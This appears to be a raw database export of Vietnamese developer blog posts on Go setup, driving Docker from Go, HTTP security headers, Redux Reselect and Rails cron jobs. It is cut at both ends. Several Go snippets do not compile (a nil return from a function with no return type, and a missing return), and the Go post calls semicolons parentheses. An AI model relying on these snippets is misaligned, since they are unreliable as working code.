PATH=$PATH:$(go env GOPATH)/bin" >> ~/.profile\n$ source ~/.profile\n``` \n\n2. **Mac**\n\nVới Mac đơn giản hơn, bạn vẫn vào [https://golang.org/dl/](https://golang.org/dl/) và tải phiên bản dành cho mac và install như bình thường. \n\nPackage này sẽ tự động cài đặt go vào thư mục */usr/local/*  và set đường dẫn */usr/local/go/bin* vào biến PATH. Nếu bạn đang để bất cứ terminal nào thì ta cần reset để biến PATH mới có hiệu lực.\n\n3. **Windown**\n\nTa tải bản Windown MSI Installer từ  [https://golang.org/dl/](https://golang.org/dl/) . Ta mở installer và làm theo hướng dẫn. Mặc định, instraller sẽ cài Go tại **C:\\Go**\n\nĐể kiểm tra lại xem ta đã cài đặt  đã hoàn tất chưa, ta mở terminal và gõ command như sau:\n\n![](https://images.viblo.asia/15b327f3-7903-4e35-bd50-34aa439b5c60.png)\n\n# GOPATH, Go workspace\n\nGo rằng buộc chúng ta thư mục tổ chức để lưu giữ các đoạn code:\n> Toàn bộ Go code và package bạn import phải nằm trong một workspace. Một workspace là một thư mục trong hệ thống mà đường dẫn là một biến môi trường tên là **GOPATH**\n> \n\nThư mục workspace sẽ chứa những thư mục con như sau:\n\n* **src:** Nơi đây sẽ chứa toàn bộ source code chương trình Go.\n\n> Trong Go, mọi chương trình đều phải nằm trong một package. Do đó, mỗi khi bạn khởi tạo một project Go mới, bạn cần tạo một thư mục trong **$GOPATH/src** và làm việc trong đó.\n\n* **bin:** Nơi đây sẽ chứa mã nhị phân là những đoạn code Go từ src được compile.\n* **pkg:** Nơi đây sẽ chứa các package mà ta sẽ import và sử dụng trong nhưng đoạn code Go trong thư mục *src*.\n> Nơi đây chứa các thư file source code đã được compiled và có đuôi **.a**. Toàn bộ package này đã được tối ưu máy và Go. \n> \n\n> Trong Go, để import một package ta sử dụng **import "tên package"** hay **import "main/<tên package con>"**. Cú pháp này làm mình liên tưởng tới cú pháp trong ES6. Go sẽ tìm kiếm các package này trong **$GOROOT/src** hay **$GOPATH/src**. \n> \n=> Việc sử dụng các package object này giúp giảm thời gian compile cho chương trình bạn muốn chạy. Mỗi package đều là một collection các chương trình Go, đều phải chạy qua bộ compiler của Go mỗi khi chương trình chính được compile. Nếu package đã được compile và được chuyển vào thư mục pkg, nó sẽ không được compile lại.\n\n# Chạy chương trình đầu tiên\n\nTrước tiên, ta cần tạo một GO workspace ở địa chỉ $HOME/go.\n\nĐầu tiên, ta cần set giá trị GOPATH:\n```\n$ sudo nano ~/.profile\n# Thêm vào cuối file 2 dòng\nexport GOPATH=$HOME/go\nexport PATH=$PATH:/usr/local/go/bin:$GOPATH/bin\n# Lưu lại và chạy\n$ source ~/.profile\n```\n\nSau đó ta vào thư mục *$HOME/go* và tạo một thư mục là *src/home*\n\nCuối cùng là tạo một file tên là hello.go và bắt đầu viết code:\n```go\npackage main\n\nimport "fmt"\n\nfunc main() {\n\tfmt.Printf("Hello, World\\n")\n}\n```\n\nCác đơn giản nhất để chạy một chương trình là sử dụng lệnh *go run*:\n![](https://images.viblo.asia/c28e494a-ace8-4ce8-841f-019535e35695.png)\n\nNhư ví dụ trên, fmt là một package có sẵn của Go dùng để format dữ liệu I/O tương tự như bên C.\n\nChú ta import các package bằng từ khóa **import**, **func main()** sẽ là nơi chương trình bắt đầu thử thi. **Println** là một function nằm trong package **fmt** giúp hiển thị ra đoạn string "Hello, World".\n\n**Ngoài ra bạn có thể build code Go của bạn thành mã nhị phân bằng câu lệnh go build**\n```shell\n$ cd $GOPATH/src/hello\n$ go build\n$ ./hello\nHello world\n```\n\n**Cài package vào thư mục bin bằng câu lệnh go install**\n\n```shell\n$ cd $GOPATH/src/hello\n$ go install\n$ cd $GOPATH/bin\n$ ./hello\nHello world\n```\n\n# Go Package\n![](https://miro.medium.com/max/700/1*16AcelCn5LA1lL7TJPslTw.png)\nTa có coi một package là một gói các đoạn code, giúp bạn tổ chức chương trình của bạn. Nó giúp bạn có thể gói một hoặc nhiều file  source code vào một file duy nhất và có thể sử dụng lại\n\nBạn có thể coi một package trong Go như một namespaces trong các ngôn ngữ khác. Điểm duy nhất khác biệt là sẽ không có các Package con, và các package sẽ nhỏ và nhiều.\n\n*  Tất cả source code đều phải nằm trong một package\n\n>Chương trình của Go được cấu tạo bởi một hoặc nhiều package.\n>\n* Single concept\n\n> Ta chỉ bỏ nhưng đoạn code liên quan vào trong package và phải đặt tên pacakge theo đúng chuẩn. Bạn có thể đọc guide cách đặt tên package tại đây [https://blog.golang.org/package-names](https://blog.golang.org/package-names).\n> \n\n* Có thể chưa không hoặc nhiều function và state\n\n> Package trong go có thể chỉ cần chứa duy nhất một function như tỉnh tổng 2 số. Package không nhất thiết phải to như các ngôn ngữ khác.\n> \n* Tái sử dụng\n> Ta có thể export function và data tử một pacakge khác.\n> \n* Import duy nhất một lần\n\n> Bạn có thể import một package trong nhiều package khác, và nó sẽ chỉ được import duy nhất một lần mà thôi.\n> \n\n\n# Comments trong Go\n\nNếu bạn là một người đã có kinh nghiệm lập trình JavaScript hay C++, Go sử dụng cú pháp tương tự. Để comment một dòng, bạn sử dụng //comment, và cho nhiều dòng thì ta sử dụng /* comment */\n\n```go\n// Commet một dòng\n\n/*\n    Comment nhiều dòng\n*/\n```\n# Dấu ngoặc đơn\n\nNhìn vào đoạn code bên trên, bạn có thể nhận ra rằng Golang không có ngoặc đơn, khác hoàn toàn so với các ngôn ngữ khác như C, C++, JavaScript.\n\nGo vẫn sử dụng dấu ngoặc đơn để cắt các câu lệnh giống C, nhưng có một điểm khác là các dấu ngoặc đơn này sẽ không xuất hiện trong source code. Thay vào đó, Lexer trong Go sẽ tự động thêm các dấu ngoặc đơn vào các câu lệnh trước khi chương trình để complite.\nNơi bạn có thể bắt gặp dấu ngoặc đơn thường xuyên là trong vòng lặp for thi các câu lệnh phải được ngăn cách và câu lệch switch-case.\n\n**Vòng lặp for**\n```go\npackage main\n\nimport "fmt"\n\nfunc main() {\n\tsum := 0\n\tfor i := 0; i < 10; i++ {\n\t\tsum += i\n\t}\n\tfmt.Println(sum)\n}\n\n```\n# Tổng kết\nĐây là bài đầu tiên trong series học Golang của mình. Mình sẽ tiếp tục cập nhật ở những bài tới. Nếu có bất cứ vấn đề gì, vui lòng comment vào phía bên dưới :clap:	Go là gì?\n\nGo hay Golang là một ngôn ngữ lập trình, được bắt nguồn từ Google. Hiện nay ngôn ngữ lập trình này được open source và maintain bởi các kĩ sư lập trình của Google. Ban đầu, bộ compliter của Go được viết bằng ngôn ngữ C nhưng sau nhiều phiên bản, bộ compiler giờ đã được viết lại hoàn chỉnh bằng chính Go.\n\nNhững đặc điểm chính của Go\n* Go là ngôn ngữ statically typed.\n* Go có sẵn một b...	{https://images.viblo.asia/15b327f3-7903-4e35-bd50-34aa439b5c60.png,https://images.viblo.asia/c28e494a-ace8-4ce8-841f-019535e35695.png}	1	Nhập môn Golang	{go,golang}	0	f	2022-12-18 15:33:37.919+00	2022-12-18 15:33:37.919+00
31959	## Mở đầu.\nTiếp nối phần phần sử dụng Go để dựng Docker Container ở  [Điều khiển Docker từ Go](https://viblo.asia/p/bat-dau-voi-ngon-ngu-lap-trinh-go-bWrZnw9mlxw#_dieu-khien-docker-tu-go-lang--3), hôm nay mình sẽ chia sẻ về cách thao tác khác tới Docker Engine.\n\n## Pull image \nVề logic thì cũng khá đơn giản, chúng ta tạo 1 docker client bằng hàm `NewEnvClient()`, và gọi tới func `ImagePull` hàm này sẽ pull image về từ Docker Hub. Hàm `ImagePull` nhận params là giá trị image cần pull và  `types.ImagePullOptions`.\n\n```go\npackage main\n\nimport (\n\t"io"\n\t"os"\n\n\t"github.com/docker/docker/api/types"\n\t"github.com/docker/docker/client"\n\t"golang.org/x/net/context"\n)\n\nfunc pullImage(image string) {\n\tctx := context.Background()\n\tcli, err := client.NewEnvClient()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tout, err := cli.ImagePull(ctx, image, types.ImagePullOptions{})\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tdefer out.Close()\n\n\tio.Copy(os.Stdout, out)\n    return nil\n}\n```\n\nNgoài ra, để pull được các Docker image private thì bạn cần pass thêm param chứa thông tin authentication vào `ImagePull`.\n\n``` go\nauthConfig := types.AuthConfig{\n    Username: "username",\n    Password: "password",\n}\nencodedJSON, err := json.Marshal(authConfig)\nif err != nil {\n    panic(err)\n}\nauthStr := base64.URLEncoding.EncodeToString(encodedJSON)\nout, err := cli.ImagePull(ctx, image, types.ImagePullOptions{RegistryAuth: authStr})\n```\n## Liệt kê các containers\nMình sẽ implement hàm tương tự với command: \n``` shell\ndocker container ps\n```\n\nVề logic thì cũng khá đơn giản, chúng ta tạo 1 docker client bằng hàm `NewEnvClient()`, và gọi tới func `ContainerList` hàm này sẽ trả về danh sách containers. Hàm `ContainerList` nhận vào 1 vài option để limit, filter thông qua `types.ContainerListOptions`.\n\n``` go\nimport (\n\t"context"\n\t"fmt"\n    \n\t"github.com/docker/docker/api/types"\n\t"github.com/docker/docker/client"\n)\n\nfunc ListContainer() error {\n\tcli, err := client.NewEnvClient()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n  \n\tcontainers, err := cli.ContainerList(context.Background(), types.ContainerListOptions{})\n\tif err != nil {\n\t\tpanic(err)\n\t}\n  \n\tif len(containers) > 0 {\n\t\tfor _, container := range containers {\n\t\t\tfmt.Printf("Container ID: %s", container.ID)\n\t\t}\n\t} else {\n\t\tfmt.Println("There are no containers running")\n\t}\n\treturn nil\n}\n```\n\n## Tắt Docker container\nHàm này tương tự với command `$ docker container stop <container-id>`\n\n``` go\nimport (\n\t"context"\n\n\t"github.com/docker/docker/client"\n)\n\nfunc StopContainer(containerID string) error {\n\tcli, err := client.NewEnvClient()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t\n\terr = cli.ContainerStop(context.Background(), containerID, nil)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn err\n}\n```\n\nTừ object được tạo ra bởi hàm `NewEnvClient`, chúng ta sử dụng hàm `ContainerStop` để tắt container đang chạy, hàm `ContainerStop()` nhận vào tham số timeout ở cuối. Nhưng mình không sử dụng đến nó, nên mình đang pass vào giá trị `nil`.\n\n ## Tắt toàn bộ các containers\n \n Để tắt toàn bộ các containers, mình sẽ lấy danh sách các container đang chạy, và sự đến hàm `StopContainer` mà mình vừa implement ở trên.\n \n ``` Go\n package main\n\nimport (\n\t"fmt"\n    \n\t"github.com/docker/docker/api/types"\n\t"github.com/docker/docker/client"\n\t"golang.org/x/net/context"\n)\n\nfunc main() {\n\tctx := context.Background()\n\tcli, err := client.NewEnvClient()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tcontainers, err := cli.ContainerList(ctx, types.ContainerListOptions{})\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfor _, container := range containers {\n\t\tfmt.Print("Stopping container ", container.ID[:10], "... ")\n\t\tif err := StopContainer(container.ID); err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\tfmt.Println("Success")\n\t}\n}\n ```\n\n## Đọc logs từ trong container\n\nĐể đọc logs từ trong container, mình sử dụng func `ContainerLogs`, tham số truyền vào hàm gồm container id và `types.ContainerLogsOptions`.\n\n`out` được trả về từ func ContainerLogs mình sẽ copy qua os.Stdout để hiện thị ra.\n\n``` go\npackage main\n\nimport (\n\t"io"\n\t"os"\n\n\t"github.com/docker/docker/api/types"\n\t"github.com/docker/docker/client"\n\t"golang.org/x/net/context"\n)\n\nfunc logging(containerId string) error {\n    ctx := context.Background()\n    cli, err := client.NewEnvClient()\n    if err != nil {\n        panic(err)\n    }\n\n    options := types.ContainerLogsOptions{ShowStdout: true}\n    out, err := cli.ContainerLogs(ctx, containerId, options)\n    if err != nil {\n        panic(err)\n    }\n\n    io.Copy(os.Stdout, out)\n}\n```\n\n## Tạm kết\nVậy là mình đã cùng các bạn thực hiện implement các thao tác cơ bản với Docker bằng Go. Trong bài viết tới, hy vọng mình sẽ cùng các bạn implement 1 ứng dụng nho nhỏ sử dụng Go và Docker, như 1 service CI chẳng hạn :D	Mở đầu.\nTiếp nối phần phần sử dụng Go để dựng Docker Container ở  Điều khiển Docker từ Go, hôm nay mình sẽ chia sẻ về cách thao tác khác tới Docker Engine.\n\nPull image\nVề logic thì cũng khá đơn giản, chúng ta tạo 1 docker client bằng hàm NewEnvClient(), và gọi tới func ImagePull hàm này sẽ pull image về từ Docker Hub. Hàm ImagePull nhận params là giá trị image cần pull và  types.ImagePullOption...	{}	1	Sử dụng Golang tương tác với Docker.	{laravel,docker,php,golang}	0	f	2022-12-18 15:33:37.981+00	2022-12-18 15:33:37.981+00
31687	# What are HTTP Security Headers?\n![](https://images.viblo.asia/ea8dfce1-7451-4d85-9191-0b431f6d7de7.png)\n\nHTTP headers được web client và web server sử dụng để chia sẻ thông tin như một phần của giao thức HTTP. Khi người dùng truy cập một website thông qua trình duyệt, trình duyệt sẽ gửi một HTTP request chứa client headers, server sẽ phản hồi với HTTP response chứa các server headers. Các headers này cung cấp cho trình duyệt cách giao tiếp với website. Headers chủ yếu bao gồm metadata. Metadata được xử lý độc quyền bởi trình duyệt web và đã được đưa vào giao thức HTTP kể từ phiên bản 1.0.\n\nHTTP Security Headers là các HTTP response headers xác định các biện pháp bảo mật nên được kích hoạt hay vô hiệu hóa trên trình duyệt web. HTTP Security Headers là một phần cơ bản của bảo mật website, giúp chống lại các cuộc tấn công mà website có nguy cơ gặp phải cao như:  **MIME types, clickjacking, code injection, XSS**...\n\nTrong bài viết này, đưa ra các HTTP headers quan trọng nhất nên cấu hình trên web server để nâng cao bảo mật cho website. Chúng ta sẽ tìm hiểu vai trò của từng header là gì và những cuộc tấn công nào có thể được thực hiện khi cấu hình sai header đó.  Dưới đây là **5 Security Headers** sẽ cung cấp cho website một số bảo vệ rất cần thiết.\n### 1. HTTP Strict Transport Security (HSTS)\n\n![](https://images.viblo.asia/6e16a3f8-479e-4f79-8757-b1de7081b7d4.png)\nNhư tên cho thấy, HSTS là một cơ chế buộc các trình duyệt sử dụng kết nối web an toàn.\n\nNếu một trang web được trang bị HSTS, sever sẽ buộc trình duyệt giao tiếp qua HTTPS (HTTP Secure), đảm bảo tất cả thông tin từ trình duyệt được gửi qua HTTPS. Điều này ngăn chặn chuyển hướng request từ HTTP đến HTTPS.\n\nTrước khi cấu hình header này, cần đảm bảo tất cả website có thể truy cập được qua HTTPS nếu không chúng sẽ bị chặn.\n\nHSTS header được hỗ trợ trên tất cả các phiên bản mới nhất của trình duyệt như IE, Firefox, Opera, Safari và Chrome.\n\nCó ba tham số cấu hình như sau:\n\n- Max-age: Thời lượng (Tính bằng giây) để xác định thời gian được truy cập server chỉ thông qua HTTPS. Giá trị mặc định là 31536000 giây (1 năm). Đây là độ tuổi tối đa mà HSTS hợp lệ. Server cập nhật chúng với mọi response mới, do đó ngăn không cho nó hết hạn.\n\n- IncludeSubDomains: Cấu hình subdomains, kiểm soát các subdomains của  website.\n\n- Preload: Sử dụng nếu muốn đưa website vào danh sách preload. Đây là danh sách các trang web được mã hóa cứng vào Chrome. Sử dụng form [này](https://hstspreload.org/) để thêm. Danh sách này được duy trì bởi Google nhưng các trình duyệt khác cũng sử dụng nó. Danh sách preload có thể được tìm thấy ở [đây](https://chromium.googlesource.com/chromium/src/+/master/net/http/transport_security_state_static.json).\n\nNguy cơ tấn công: Nếu không kích hoạt HSTS, khi nạn nhân kết nối với Wi-Fi mở nằm trong sự kiểm soát của kẻ tấn công, sau đó truy cập một website qua HTTP sẽ cho phép kẻ tấn công chặn request và đọc thông tin gửi lên server. Nếu người dùng đã truy cập website trước đó, các HSTS headers được lưu trong trình duyệt tự động kết nối server qua HTTPS.\n\n**Cú pháp:**\n```\nStrict-Transport-Security: max-age=max-age=\nStrict-Transport-Security: max-age=; includeSubDomains\nStrict-Transport-Security: max-age=; preload\n```\n**Ví dụ:**\n```\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n### 2. Content Security Policy (CSP)\n![](https://images.viblo.asia/103e997f-b4e6-41b1-83a9-b51245dafe91.png)\n\nCSP cung cấp cho quản trị viên kiểm soát website bằng cách hạn chế tài nguyên mà người dùng được phép tải trong website. Có thể đưa whitelist vào nội dung của website. Nếu được triển khai đúng cách, header này sẽ ngăn chặn việc khai thác Cross-Site Scripting (XSS) , ClickJacking và HTML... Mặc dù không loại bỏ hoàn toàn các khả năng tấn công này, nhưng chắc chắn giảm thiểu thiệt hại. Hầu hết các trình duyệt chính đều hỗ trợ CSP.\n\nĐược giới thiệu vào tháng 11 năm 2012, CSP thêm một lớp bảo mật chống lại nhiều lỗ hổng bảo mật website. CSP sẽ trở thành công cụ quan trọng nhất cho bảo mật phía máy khách trong tương lai gần, vì nó có thể thay thế cho các tiêu đề bảo mật như: X-Frame-Options, X-XSS-Protection, là 2 cấu hình không được bật theo mặc định.\n\nTất cả các trình duyệt không hỗ trợ CSP, vì vậy cần xác minh trước khi triển khai.\n\nCó nhiều tham số có thể thực hiện CSP. Tuy nhiên, chúng ta hãy xem 2 tham số được sử dụng nhiều nhất: \n\n- default-src: Tải mọi thứ từ một nguồn xác định.\n\n- script-src: Chỉ tải các tập lệnh từ nguồn được xác định.\n\n**Cú pháp:**\n```\nContent-Security-Policy: <policy-directive>; <policy-directive>\n```\n**Ví dụ:**\n```\nContent-Security-Policy: script-src 'self' https://viblo.asia\n```\nCSP này chỉ cho phép tải mọi thứ qua domain hiện tại hoặc qua https://viblo.asia.\n### 3. Cross Site Scripting Protection (X-XSS)\n![](https://images.viblo.asia/fed865f9-0db4-43d5-8cd4-a693f2bc4867.png)\n\nX-XSS header bảo vệ chống lại các cuộc tấn công Cross-Site Scripting (XSS). Bộ lọc này nhằm phát hiện đầu vào HTML nguy hiểm và ngăn website tải hoặc xóa các tập lệnh độc hại.\n\nX-XSS được bật trong Chrome, IE và Safari theo mặc định, nó có 4 chế độ:\n \n- 0: Bộ lọc XSS bị vô hiệu hóa.\n\n- 1: Bộ lọc XSS được kích hoạt và bảo vệ trang nếu phát hiện tấn công.\n\n- 1;mode=block: Bộ lọc XSS được kích hoạt và ngăn chặn hiển thị trang nếu phát hiện tấn công.\n\n- 1;report=https://viblo.asia: Bộ lọc XSS được kích hoạt và báo cáo vi phạm nếu phát hiện cuộc tấn công.\n\n**Cú pháp:**\n```\nX-XSS-Protection: 0\nX-XSS-Protection: 1\nX-XSS-Protection: 1; mode=block\nX-XSS-Protection: 1; report=<reporting-uri>\n```\n**Ví dụ:**\n```\nX-XSS-Protection: 1; mode=block; report=https://viblo.asia\n```\n### 4. X-Frame-Options\n![](https://images.viblo.asia/b5b84a15-b48c-4f2a-b249-648bb5ba4816.png)\n\nMột kỹ thuật giả mạo có tên là "Clickjacking" khá phổ biến. Trong kỹ thuật này, kẻ tấn công đánh lừa người dùng nhấp vào thứ gì đó không có ở website. Khi người dùng đang ở trên trang web chính thức, nhưng một luôn có một hành động đang chạy trong nền. Trong quá trình này, có thể những thông tin của người dùng đang bị đánh cắp. X-Frame-Options giúp bảo vệ chống lại hình thức tấn công kiểu này bằng cách vô hiệu hóa các iframe có trên website. Nói cách khác, nó không cho phép người khác nhúng nội dung của website.\n\nCó 3 tùy chọn cho X-FrameOptions:\n\n- SAMEORIGIN: Iframe trong website chỉ được phép từ cùng một nguồn gốc.\n\n- DENY:\tNgăn chặn bất kỳ tên miền nào nhúng nội dung vào website bằng cách sử dụng iframe.\n\n- ALLOW-FROM: Chỉ cho phép iframe trên URI cụ thể.\n\nNguy cơ tấn công: Kẻ tấn công thể lừa người dùng truy cập một website độc hại, một iframe vô hình được cài sẵn. Khi người dùng nhấp vào iframe, các các thông tin bị đánh cắp và được gửi đến server khác. Do đó, người dùng sẽ nhấp vào các tùy chọn trái phép, dẫn đến việc thực hiện một số hành động không mong muốn như: Xóa tài khoản...\n\n**Cú pháp:**\n```\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nX-Frame-Options: ALLOW-FROM https://viblo.asia\n```\n### 5. X-Content-Type-Options\n![](https://images.viblo.asia/1e72cd37-af61-4170-a546-638c9d7b9bd6.png)\n\nX-Content-Type header cung cấp biện pháp ngăn chặn rủi ro bảo mật loại MIME. Nó hướng dẫn trình duyệt theo các loại MIME được chỉ định trong tiêu đề. Nếu Nếu header này trống hoặc bị thiếu, trình duyệt phân tích nội dung và hiển thị theo cách phù hợp nhất.\n\nX-Content-Type hoạt động như sau:\n\n(1) Trình duyệt web request một tập tin. Server sẽ response một tệp với X-Content-Type header.\n\n(2) Trình duyệt phân tích tệp này xác định định dạng tệp.\n\n(3) Sau khi thực hiện phân tích, trình duyệt sẽ so sánh kết quả với kết quả được gửi bởi máy chủ. Nếu có sự không phù hợp, trình duyệt sẽ sử dụng định dạng đã xác định.\n\n=> Điều này có thể dẫn đến một lỗ hổng bảo mật. Để ngăn trình duyệt phân tích nội dung của trang và quyết định sử dụng loại MIME nào, hãy sử dụng tiêu đề X-Content-Type-Options với chỉ thị nosniff \n\nNguy cơ tấn công:  Website cho phép người dùng tải lên một tệp hình ảnh và xác nhận phần mở rộng của nó. Người dùng tải lên một tệp hình ảnh với phần mở rộng jpg hoặc png nhưng tệp này có chứa mã HTML độc hại. Trình duyệt sẽ xác định tệp là HTML và thực thi trong trình duyệt.\n\nHeader này dành riêng cho trình duyệt IE và Chrome.\n\n**Cú pháp:**\n```\nX-Content-Type-Options: nosniff\n```\n*Thank you for reading!*\n\n**Tham khảo:**\n\n[HTTP Security Headers: 5 Headers You Must Implement on Your Site](https://www.thesslstore.com/blog/http-security-headers/)\n\n[Essential HTTP Headers for Securing Your Web Server](https://pentest-tools.com/blog/essential-http-security-headers/)\n\n[Whitepaper: HTTP Security Headers and How They Work](https://www.netsparker.com/whitepaper-http-security-headers/)\n\n[How to Implement Security HTTP Headers to Prevent Vulnerabilities?](https://geekflare.com/http-header-implementation/)	What are HTTP Security Headers?\n\nHTTP headers được web client và web server sử dụng để chia sẻ thông tin như một phần của giao thức HTTP. Khi người dùng truy cập một website thông qua trình duyệt, trình duyệt sẽ gửi một HTTP request chứa client headers, server sẽ phản hồi với HTTP response chứa các server headers. Các headers này cung cấp cho trình duyệt cách giao tiếp với website. Headers chủ ...	{https://images.viblo.asia/ea8dfce1-7451-4d85-9191-0b431f6d7de7.png,https://images.viblo.asia/6e16a3f8-479e-4f79-8757-b1de7081b7d4.png,https://images.viblo.asia/103e997f-b4e6-41b1-83a9-b51245dafe91.png,https://images.viblo.asia/fed865f9-0db4-43d5-8cd4-a693f2bc4867.png,https://images.viblo.asia/b5b84a15-b48c-4f2a-b249-648bb5ba4816.png,https://images.viblo.asia/1e72cd37-af61-4170-a546-638c9d7b9bd6.png}	1	HTTP Security Headers	{http,internet-security,information-security}	0	f	2022-12-18 15:33:38.001+00	2022-12-18 15:33:38.001+00
31998	> Redux là một thư viện tuyệt với giúp quản lý state trong React, với đầy đủ các chức năng cần thiết mà cũng không quá phức tạp. Tuy nhiên, nó vẫn có những nhược điểm khiến việc code trở nên chậm chạp và tốn giấy mực. Reselect sinh ra nhằm khắc phục các yếu điểm của redux.\n> \n\nTrích dẫn: [nguồn](https://github.com/reduxjs/reselect)\n\n### Nhược điểm chí mạng: không có computed value\n\nNếu bạn đã từng code Vue, thì sẽ thấy computed value là một thức không thể thiếu, vì:\n\n- dữ liệu lưu trong store chưa chắc đã là thứ ta cần hiển thị\n\n```\n    // dữ liệu về lương trả về từ api\n    state = {\n        luong_cung: "10000000",\n        luong_tro_cap: "300000",\n        luong_thuong: "100000",\n    } \n    \n    // tuy nhiên cái ta quan tâm chỉ là thực lĩnh vào túi :v\n    luong_tong_the = luong_cung + luong_tro_cap + luong_thuong\n    \n```\n\n- những dữ liệu cần tính toán đôi khi không phải tính toán lại vì input có thể giữ nguyên\n\n```\n    // tính lương qua thuế\n    state = {\n       ...\n       thue: 10\n    }\n    \n    // với mỗi nhân viên có cùng lương, thì đoạn code này vẫn chạy, thực tốn tài nguyên!\n    // (thực ra cũng chả tốn mấy với ví dụ này, tuy nhiên hãy tưởng tượng ta cần iterate qua 1 array)\n    luong_tong_the = .... * (1 + thue / 100)\n```\n\n### Một ví dụ của reselect\n\nVí dụ này được lấy trực tiếp từ trang chủ, câu chuyện là tính toán 1 hóa đơn siêu thị.\n\n```\nimport { createSelector } from 'reselect'\n\nconst shopItemsSelector = state => state.shop.items\nconst taxPercentSelector = state => state.shop.taxPercent\n\nconst subtotalSelector = createSelector(\n  shopItemsSelector,\n  items => items.reduce((acc, item) => acc + item.value, 0)\n)\n\nconst taxSelector = createSelector(\n  subtotalSelector,\n  taxPercentSelector,\n  (subtotal, taxPercent) => subtotal * (taxPercent / 100)\n)\n\nexport const totalSelector = createSelector(\n  subtotalSelector,\n  taxSelector,\n  (subtotal, tax) => ({ total: subtotal + tax })\n)\n\nlet exampleState = {\n  shop: {\n    taxPercent: 8,\n    items: [\n      { name: 'apple', value: 1.20 },\n      { name: 'orange', value: 0.95 },\n    ]\n  }\n}\n\nconsole.log(subtotalSelector(exampleState)) // 2.15\nconsole.log(taxSelector(exampleState))      // 0.172\nconsole.log(totalSelector(exampleState))    // { total: 2.322 }\n```\n\n### Kết luận:\n\nNhư vậy, nếu ứng dụng đòi hỏi việc tính toán dữ liệu nhiều thì Reselect là một lựa chọn hoàn hảo, nó dễ dàng để ta reuse code và sử dụng computed value một cách đơn giản. Nó chạy tốt với Redux và không có dependency nào cả. Tuy nhiên, nếu ứng dụng chỉ hiển thị trực tiếp dữ liệu lấy từ api mà không tính toán gì thêm, thì Reselect vẫn có thể dùng tốt trong vai trò là 1 rào cản để hạn chế thay đổi tên trường, tức mỗi khi đổi ta sẽ sửa code reselect thay vì thay toàn bộ tên field từ code javascript đến code html. Ngoài ra, nó cũng là một công cụ đắc lực để làm việc với các legacy api, khi mà tên trường không hề theo chuẩn naming convention nào cả.	Redux là một thư viện tuyệt với giúp quản lý state trong React, với đầy đủ các chức năng cần thiết mà cũng không quá phức tạp. Tuy nhiên, nó vẫn có những nhược điểm khiến việc code trở nên chậm chạp và tốn giấy mực. Reselect sinh ra nhằm khắc phục các yếu điểm của redux.\nTrích dẫn: nguồn\n\nNhược điểm chí mạng: không có computed value\n\nNếu bạn đã từng code Vue, thì sẽ thấy computed value là một t...	{}	1	Tối giản code redux với thư viện Reselect	{library,javascript,react,redux}	0	f	2022-12-18 15:33:38.026+00	2022-12-18 15:33:38.026+00
31652	![](https://images.viblo.asia/8e50ee2e-dcad-4e42-b4f7-83657ad68ab9.png)\n# 1. Cron job là gì:\n- Đôi khi chúng ta cần implement các job cần được thực hiện theo 1 schedule cho trước, các job này được gọi chung là cron job.\n- Các job này có thể là gửi remind email cho user hằng ngày, gọi API crawl data của third party để import hoặc update data của app mỗi tuần 1 lần, xóa cache, xóa log, backup database, ...\n- Trong Rails chúng ta có thể sử dụng gem `whenever` để lên schedule cho cronjob.\n\n# 2. Tạo demo app:\n- Chạy các command sau để tạo 1 app đơn giản.\n    ```ruby\n    rails new demo_whenever_revise\n    ```\n- Chạy các command migration cho user.\n    ```ruby\n    rails g model user email name\n    rails db:migrate\n    ```\n- Thêm gem `ffaker` vào `Gemfile`.\n    ```ruby\n    # Gemfile\n    gem "ffaker"\n    ```\n- Chạy command `bundle install` để install gem `ffaker`.\n    ```ruby\n    bundle install\n    ```\n- Tạo seed data cho user.\n    ```ruby\n    # db/seeds.rb\n    10.times do\n      User.create email: FFaker::Internet.email, name: FFaker::Name.name\n    end\n    ```\n- Chạy command `rails db:seed` để tạo seed data.\n    ```ruby\n    rails db:seed\n    ```\n- Tạo rake task tạo random user.\n    ```ruby\n    # lib/tasks/user/create_random.rake\n    namespace :user do\n      desc "Create random user"\n\n      task create_random: :environment do\n        puts "RUNNING rake user:create_random"\n        user = User.create email: FFaker::Internet.email, name: FFaker::Name.name\n        puts "CREATED user: #{user.inspect}"\n      end\n    end\n    ```\n- Chạy command `rake user:create_random` để test rake task vừa tạo.\n    ```ruby\n    rake user:create_random\n    ```\n- Tiếp theo chúng ta sẽ dùng gem `whenever` để tạo cronjob cho rake task này. Let's go!\n\n# 3. Gem whenever:\n## a. Install:\n- Thêm gem `whenever` vào `Gemfile`.\n    ```ruby\n    # Gemfile\n    gem "whenever"\n    ```\n- Chạy command `bundle install` để install gem `whenever`.\n    ```ruby\n    bundle install\n    ```\n- Chạy command `wheneverize` để generate file `config/schedule.rb`.\n    ```ruby\n    wheneverize\n    ```\n\n## b. Update file config/schedule.rb:\n- Update lại file `config/schedule.rb` như sau.\n    ```ruby\n    # config/schedule.rb\n    every 1.minutes do\n      rake "user:create_random"\n    end\n    ```\n- Mỗi lần update file `config/schedule.rb` ta cần chạy command `whenever --update-crontab` để update lại crontab.\n    ```ruby\n    whenever --update-crontab\n    ```\n- Chạy lại command `whenever` để check lại crontab.\n    ```\n    whenever\n    ```\n- Check lại outout của crontab ta được kết quả như sau.\n    ```\n    * * * * * /bin/bash -l -c 'cd /home/hcm-102-0003/Desktop/demo_whenever_revise && RAILS_ENV=production bundle exec rake user:create_random --silent'\n\n    ## [message] Above is your schedule file converted to cron syntax; your crontab file was not updated.\n    ## [message] Run `whenever --help' for more options.\n    ```\n- Ta thấy `RAILS_ENV` đang được set giá trị là `production`, có nghĩa là crontab này chỉ được chạy ở môi trường  production, không được chạy ở môi trường development hay staging.\n- Nguyên nhân là môi trường chạy crontab được lưu trong biến `@environment` và biến này có giá trọ mặc định là production.\n- Ta có thể check lại bằng cách update lại file `config/schedule.rb`, in ra màn hình giá trị của biến `@environment`.\n    ```ruby\n    # config/schedule.rb\n    puts "Crontab is run on #{@environment}"\n    ```\n- Sau đó chạy lại command `whenever --update-crontab`\n    